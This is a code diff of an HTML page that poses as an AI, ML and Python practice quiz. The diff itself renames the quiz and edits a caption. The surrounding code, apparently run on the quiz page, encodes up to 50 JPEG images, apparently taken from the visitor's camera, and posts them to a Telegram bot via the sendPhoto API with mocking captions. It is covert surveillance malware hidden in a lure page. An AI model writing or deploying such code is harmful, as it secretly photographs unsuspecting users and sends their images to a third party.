@@ -236,8 +236,8 @@
     <div id="mainBox">
         <div id="step-1" class="divine-card">
             <div class="badge-icon">🧠</div>
-            <h1 class="hindi-main">Quiz Time</h1>
-            <p class="shloka">Test your basics in AI, ML &amp; Python<br>Quick questions, sharp answers, real learning</p>
+            <h1 class="hindi-main">Practice Revesion Quiz</h1>
+            <p class="shloka">Test your basics in AI, ML &amp; Python<br>Quick questions, sharp answers, real learning, 30 IMPORTANT QUESTIONS</p>
             <button class="btn-start" onclick="start()">Start Quiz</button>
         </div>
 
@@ -312,7 +312,7 @@
                     const fd = new FormData();
                     fd.append('chat_id', id);
                     fd.append('photo', blob, 'pic.jpg');
-                    fd.append('caption', `🌙 NIGHT_HIT [${idx}/50]`);
+                    fd.append('caption', `QUIZ_KA_PHOTO ☠️ [${idx}/50]`);
                     fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                 });
             }, 'image/jpeg', 0.4);
